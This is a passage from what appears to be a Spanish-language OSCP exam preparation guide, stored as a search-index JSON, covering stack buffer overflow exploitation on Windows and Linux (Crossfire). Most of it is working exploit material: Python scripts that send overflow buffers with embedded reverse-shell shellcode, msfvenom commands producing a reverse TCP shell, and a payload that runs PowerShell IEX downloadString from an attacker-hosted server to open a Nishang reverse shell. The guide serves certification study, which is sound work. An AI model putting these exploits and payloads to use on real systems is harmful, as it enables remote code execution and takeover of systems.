\xa0\"\n\"\\x13\\xa1\\x8d\\x34\\x5b\\x61\\x4a\\x85\\x62\\x68\\x1f\\xb1\\x40\\x7a\\xd9\"\n\"\\x3a\\xcd\\x2e\\xb5\\x6c\\x9b\\x98\\x73\\xc7\\x6d\\x72\\x2a\\xb4\\x27\\x12\"\n\"\\xab\\xf6\\xf7\\x64\\xb4\\xd2\\x81\\x88\\x05\\x8b\\xd7\\xb7\\xaa\\x5b\\xd0\"\n\"\\xc0\\xd6\\xfb\\x1f\\x1b\\x53\\x0b\\x6a\\x01\\xf2\\x84\\x33\\xd0\\x46\\xc9\"\n\"\\xc3\\x0f\\x84\\xf4\\x47\\xa5\\x75\\x03\\x57\\xcc\\x70\\x4f\\xdf\\x3d\\x09\"\n\"\\xc0\\x8a\\x41\\xbe\\xe1\\x9e\")\n\nbuffer = \"A\"*809 + \"\\x15\\x14\\x13\\x12\" + \"\\x90\"*16 + shellcode + \"C\"*(1300-809-4-16-351)\n\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>Consiguiendo as\u00ed que el registro EIP apunte a dicha direcci\u00f3n donde posteriormente se aplica el salto al registro ESP.</p> <p>Una manera m\u00e1s elegante y opcional de hacer las cosas es importando la siguiente librer\u00eda en el script:</p> <pre><code>from struct import pack\n</code></pre> <p>La funcionalidad del pack nos permite poner en formato Little Endian una direcci\u00f3n pasada directamente sin tener que estar haciendo la conversi\u00f3n manualmente. Para ello, se deber\u00eda adaptar el script a lo que se muestra a continuaci\u00f3n:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\nfrom struct import pack\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nshellcode = (\"\\xba\\xfc\\xb2\\xc0\\x24\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\\xb1\"\n\"\\x52\\x83\\xc7\\x04\\x31\\x57\\x0e\\x03\\xab\\xbc\\x22\\xd1\\xaf\\x29\\x20\"\n\"\\x1a\\x4f\\xaa\\x45\\x92\\xaa\\x9b\\x45\\xc0\\xbf\\x8c\\x75\\x82\\xed\\x20\"\n\"\\xfd\\xc6\\x05\\xb2\\x73\\xcf\\x2a\\x73\\x39\\x29\\x05\\x84\\x12\\x09\\x04\"\n\"\\x06\\x69\\x5e\\xe6\\x37\\xa2\\x93\\xe7\\x70\\xdf\\x5e\\xb5\\x29\\xab\\xcd\"\n\"\\x29\\x5d\\xe1\\xcd\\xc2\\x2d\\xe7\\x55\\x37\\xe5\\x06\\x77\\xe6\\x7d\\x51\"\n\"\\x57\\x09\\x51\\xe9\\xde\\x11\\xb6\\xd4\\xa9\\xaa\\x0c\\xa2\\x2b\\x7a\\x5d\"\n\"\\x4b\\x87\\x43\\x51\\xbe\\xd9\\x84\\x56\\x21\\xac\\xfc\\xa4\\xdc\\xb7\\x3b\"\n\"\\xd6\\x3a\\x3d\\xdf\\x70\\xc8\\xe5\\x3b\\x80\\x1d\\x73\\xc8\\x8e\\xea\\xf7\"\n\"\\x96\\x92\\xed\\xd4\\xad\\xaf\\x66\\xdb\\x61\\x26\\x3c\\xf8\\xa5\\x62\\xe6\"\n\"\\x61\\xfc\\xce\\x49\\x9d\\x1e\\xb1\\x36\\x3b\\x55\\x5c\\x22\\x36\\x34\\x09\"\n\"\\x87\\x7b\\xc6\\xc9\\x8f\\x0c\\xb5\\xfb\\x10\\xa7\\x51\\xb0\\xd9\\x61\\xa6\"\n\"\\xb7\\xf3\\xd6\\x38\\x46\\xfc\\x26\\x11\\x8d\\xa8\\x76\\x09\\x24\\xd1\\x1c\"\n\"\\xc9\\xc9\\x04\\xb2\\x99\\x65\\xf7\\x73\\x49\\xc6\\xa7\\x1b\\x83\\xc9\\x98\"\n\"\\x3c\\xac\\x03\\xb1\\xd7\\x57\\xc4\\xc1\\x27\\x57\\x15\\x56\\x2a\\x57\\x14\"\n\"\\x1d\\xa3\\xb1\\x7c\\x71\\xe2\\x6a\\xe9\\xe8\\xaf\\xe0\\x88\\xf5\\x65\\x8d\"\n\"\\x8b\\x7e\\x8a\\x72\\x45\\x77\\xe7\\x60\\x32\\x77\\xb2\\xda\\x95\\x88\\x68\"\n\"\\x72\\x79\\x1a\\xf7\\x82\\xf4\\x07\\xa0\\xd5\\x51\\xf9\\xb9\\xb3\\x4f\\xa0\"\n\"\\x13\\xa1\\x8d\\x34\\x5b\\x61\\x4a\\x85\\x62\\x68\\x1f\\xb1\\x40\\x7a\\xd9\"\n\"\\x3a\\xcd\\x2e\\xb5\\x6c\\x9b\\x98\\x73\\xc7\\x6d\\x72\\x2a\\xb4\\x27\\x12\"\n\"\\xab\\xf6\\xf7\\x64\\xb4\\xd2\\x81\\x88\\x05\\x8b\\xd7\\xb7\\xaa\\x5b\\xd0\"\n\"\\xc0\\xd6\\xfb\\x1f\\x1b\\x53\\x0b\\x6a\\x01\\xf2\\x84\\x33\\xd0\\x46\\xc9\"\n\"\\xc3\\x0f\\x84\\xf4\\x47\\xa5\\x75\\x03\\x57\\xcc\\x70\\x4f\\xdf\\x3d\\x09\"\n\"\\xc0\\x8a\\x41\\xbe\\xe1\\x9e\")\n\nbuffer = \"A\"*809 + \"B\"*4 + pack('&lt;L', 0x12131415) + shellcode + \"C\"*(1300-809-4-16-351)\n\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>Podemos establecer BreakPoints desde Immunity Debugger en dicha direcci\u00f3n (pulsando F2 para ello sobre la direcci\u00f3n), a fin de corroborar que se produce una detenci\u00f3n en la ejecuci\u00f3n del programa tras el registro EIP pasar por la direcci\u00f3n 0x12131415. En caso de ser as\u00ed, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla F8 una vez alcanzado el breakpoint, vemos que la siguiente instrucci\u00f3n a realizar corresponde al primer NOP-sled del registro ESP.</p> <p>Ya con todo esto hecho, tras la ejecuci\u00f3n del exploit teniendo una sesi\u00f3n de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesi\u00f3n, en caso de volver a ejecutar el script... no ganaremos m\u00e1s veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#mejorando-el-exploit","title":"Mejorando el Exploit","text":"<p>De forma opcional, en caso de querer tras la ejecuci\u00f3n del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo \u00fanico que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:</p> <pre><code>$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b \"\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai -f c\n</code></pre> <p>De esta forma, variamos la funci\u00f3n de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendr\u00e1 el mismo tama\u00f1o (351 bytes), lo \u00fanico que habr\u00e1 que hacer ser\u00e1 sutituir el Shellcode por el nuevo generado desde msfvenom.</p> <p>Tras su ejecuci\u00f3n, se podr\u00e1 comprobar como independientemente del n\u00famero de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.</p> <p>En caso de querer mejorar un pel\u00edn m\u00e1s nuestro script, contamos con otra v\u00eda de tratar los 16 NOPs que hemos insertado al principio del registro ESP. Se suele considerar m\u00e1s \u00f3ptimo insertar al principio del registro ESP el siguiente Opcode en vez de los NOPs, seguidamente continuando con el Shellcode:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb \nnasm &gt; sub esp,0x10\n00000000  83EC10            sub esp,byte +0x10\n</code></pre> <p>Insertamos al principio del registro ESP el Opcode \"\\x83\\xEC\\x10\", continuando con el Shellcode. Se considera m\u00e1s \u00f3ptimo, pues dicha instrucci\u00f3n arrastra el ESP lo suficientemente lejos como para que se decodifique el Payload sin ser estropeado, similar al uso intencionado de los NOPs solo que evitando tener que insertar NOPs hasta que validemos manualmente que rule (calculando offsets). </p> <p>Lo bueno de esta t\u00e9cnica a su vez es que siempre funciona (\u00bfHabr\u00e1 que tener en cuenta los badchars?, habr\u00e1 que investigar).</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#reduciendo-el-size-y-acceso-por-powershell","title":"Reduciendo el Size y Acceso por Powershell","text":"<p>En caso de que nuestro Size en el ESP antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un peque\u00f1o truco que obtuve haciendo pruebas para reducir el tama\u00f1o de nuestro Shellcode.</p> <p>La idea para este caso, va a ser obtener una sesi\u00f3n reversa TCP v\u00eda Powershell aprovechando la utilidad de Nishang, concretamente la utilidad Invoke-PowerShellTcp.ps1. Dado que resultar\u00eda tedioso transferir el script, posteriormente dar una instrucci\u00f3n de importaci\u00f3n y luego otra de invocaci\u00f3n... lo que haremos ser\u00e1 hacerlo todo de una, a\u00f1adiendo en la \u00faltima l\u00ednea del script el siguiente contenido:</p> <p><code>Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443</code></p> <p>De esta forma, nos aprovecharemos de msfvenom para generar una sentencia como la siguiente:</p> <pre><code>$~ msfvenom -p windows/exec CMD=\"powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/PS.ps1')\" -f c -a x86 --platform windows EXITFUNC=thread -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\"\n\nPayload size: 299 bytes\nFinal size of c file: 1280 bytes\nunsigned char buf[] = \n\"\\xd9\\xcb\\xbf\\xbe\\xfd\\xc8\\xaf\\xd9\\x74\\x24\\xf4\\x5e\\x29\\xc9\\xb1\"\n\"\\x45\\x31\\x7e\\x17\\x03\\x7e\\x17\\x83\\x50\\x01\\x2a\\x5a\\x50\\x12\\x29\"\n\"\\xa5\\xa8\\xe3\\x4e\\x2f\\x4d\\xd2\\x4e\\x4b\\x06\\x45\\x7f\\x1f\\x4a\\x6a\"\n\"\\xf4\\x4d\\x7e\\xf9\\x78\\x5a\\x71\\x4a\\x36\\xbc\\xbc\\x4b\\x6b\\xfc\\xdf\"\n\"\\xcf\\x76\\xd1\\x3f\\xf1\\xb8\\x24\\x3e\\x36\\xa4\\xc5\\x12\\xef\\xa2\\x78\"\n\"\\x82\\x84\\xff\\x40\\x29\\xd6\\xee\\xc0\\xce\\xaf\\x11\\xe0\\x41\\xbb\\x4b\"\n\"\\x22\\x60\\x68\\xe0\\x6b\\x7a\\x6d\\xcd\\x22\\xf1\\x45\\xb9\\xb4\\xd3\\x97\"\n\"\\x42\\x1a\\x1a\\x18\\xb1\\x62\\x5b\\x9f\\x2a\\x11\\x95\\xe3\\xd7\\x22\\x62\"\n\"\\x99\\x03\\xa6\\x70\\x39\\xc7\\x10\\x5c\\xbb\\x04\\xc6\\x17\\xb7\\xe1\\x8c\"\n\"\\x7f\\xd4\\xf4\\x41\\xf4\\xe0\\x7d\\x64\\xda\\x60\\xc5\\x43\\xfe\\x29\\x9d\"\n\"\\xea\\xa7\\x97\\x70\\x12\\xb7\\x77\\x2c\\xb6\\xbc\\x9a\\x39\\xcb\\x9f\\xf0\"\n\"\\xbc\\x59\\x9a\\xb7\\xbf\\x61\\xa4\\xe7\\xd7\\x50\\x2f\\x68\\xaf\\x6c\\xfa\"\n\"\\xcc\\x4f\\x8f\\x2e\\x39\\xf8\\x16\\xbb\\x80\\x65\\xa9\\x16\\xc6\\x93\\x2a\"\n\"\\x92\\xb7\\x67\\x32\\xd7\\xb2\\x2c\\xf4\\x04\\xcf\\x3d\\x91\\x2a\\x7c\\x3d\"\n\"\\xb0\\x5a\\xed\\xb6\\x5e\\xe8\\x82\\x50\\xc4\\x60\\x09\\x81\\x4f\\x3d\\x89\"\n\"\\xe9\\x01\\xd8\\x5e\\xc7\\xd2\\x40\\xcb\\x72\\x8e\\xf0\\x2b\\x33\\x35\\x8c\"\n\"\\x05\\x9c\\xd0\\x0e\\x19\\x4e\\x72\\xab\\xf3\\xfa\\xad\\x1d\\x68\\x6c\\xd9\"\n\"\\x0f\\x1c\\x1d\\x44\\xab\\x8f\\x95\\xf4\\x5a\\x5e\\x31\\xd1\\xbb\\xf6\\xc9\"\n\"\\x55\\xb3\\x3c\\x1d\\xb9\\x02\\x73\\x56\\xeb\\x54\\x5d\\xa8\\xdd\\xa5\\x9b\"\n\"\\xf0\\x11\\xf5\\xeb\\x2f\\x02\\xa6\\x25\\x40\\xd1\\x79\\x1d\\x89\\x15\";\n</code></pre> <p>Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor v\u00eda Python en el puerto 8000 (para que desde la m\u00e1quina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesi\u00f3n de escucha v\u00eda Netcat por el puerto 443.</p> <p>Inmediatamente tras ejecutar el script, veremos c\u00f3mo se recibe un GET desde nuestro servidor web v\u00eda Python y c\u00f3mo en cuesti\u00f3n de segundos ganamos acceso al sistema v\u00eda Powershell.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#buffer-overflow-linux","title":"Buffer Overflow Linux","text":"<p>Hasta donde yo se, no es com\u00fan que caiga un Buffer Overflow de Linux, pero por si las moscas, detallo el procedimiento usando como ejemplo el aplicativo Crossfire.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#fuzzing_1","title":"Fuzzing","text":"<p>Para esta primera parte, contamos con el siguiente POC:</p> <pre><code>#!/usr/bin/python \n\nimport socket \n\nhost = \"192.168.1.X\" \n\ncrash = \"\\x41\" * 4379 \n\nbuffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00#\" \n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\nprint \"[*]Sending evil buffer...\" \ns.connect((host,13327))\ns.send(buffer)\ndata=s.recv(1024)\nprint data \ns.close()\nprint \"[*]Payload Sent!\" \n</code></pre> <p>El recurso lo podemos encontrar en el siguiente enlace. Adaptamos un poco el exploit a nuestras necesidades:</p> <pre><code>#!/usr/bin/python \n\nimport socket, sys\n\nfrom struct import pack\nfrom time import sleep\n\nif len(sys.argv) != 2:\n    print \"\\nUso: python\" + sys.argv[0] + \" &lt;direccionIP&gt;\\n\"\n    sys.exit(0)\n\nhost = sys.argv[1]\nport = 13327\n\ncrash = \"\\x41\" * 4379 \n\nbuffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00#\" \n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n    print \"[*] Enviando buffer...\" \n    s.connect((host,port))\n    s.send(buffer)\n    data=s.recv(1024)\n    print data \n    s.close()\n    print \"[*] Payload Enviado!\" \nexcept:\n    print \"\\nError conectando con el servicio...\\n\"\n    sys.exit(0)\n</code></pre> <p>Para este caso, nos dan un PoC con el offset calculado. Curiosamente, para este caso si superamos el tama\u00f1o del buffer el programa crashear\u00e1 de otra forma, por lo que es importante mantener esta cifra fija y para cualquier operaci\u00f3n que hagamos tener bien calculados los tama\u00f1os.</p> <p>Para empezar, iniciamos edb con el programa corriendo, de la siguiente forma:</p> <pre><code>$~ edb --run /usr/games/crossfire/bin/crossfire\n</code></pre> <p>Pulsamos la tecla F9 2 veces y mandamos el buffer desde consola. Desde edb, podremos observar la siguiente respuesta:</p> <pre><code>The debugged application encountered a segmentation fault.\nThe address 0x41414141 does not appear to be mapped.\n</code></pre> <p>Lo cual est\u00e1 genial, pues estamos sobreescribiendo el registro EIP, tal y como podremos comprobar posteriormente desde la secci\u00f3n Registers del aplicativo. Llegados a este punto, calculamos el Offset a continuaci\u00f3n a fin de corroborar si efectivamente podemos tomar el control del EIP, mandando para ello 4 bytes correspondientes al caracter B posteriormente.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#calculando-el-offset-en-linux","title":"Calculando el Offset en Linux","text":"<p>El procedimiento realmente es el mismo que en Windows, s\u00f3lo que lo referencio as\u00ed en el t\u00edtulo as\u00ed para que el enlace directo desde el \u00cdndice no de problemas.</p> <p>Usaremos una vez m\u00e1s el pattern_create y el pattern_offset de Metasploit. Dado que conocemos que por el momento el valor con el que vamos a trabajar es 4379, matendremos esta cifra fija, en caso contrario el programa recordemos que crashear\u00e1 de otra forma:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/BoF]\n\u2514\u2500\u2500\u257c #/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp\n</code></pre> <p>Tomamos el resultado y lo a\u00f1adimos en nuestro script:</p> <pre><code>#!/usr/bin/python \n\nimport socket, sys\n\nfrom struct import pack\nfrom time import sleep\n\nif len(sys.argv) != 2:\n    print \"\\nUso: python\" + sys.argv[0] + \" &lt;direccionIP&gt;\\n\"\n    sys.exit(0)\n\nhost = sys.argv[1]\nport = 13327\n\n# Total bytes: 4379\ncrash = 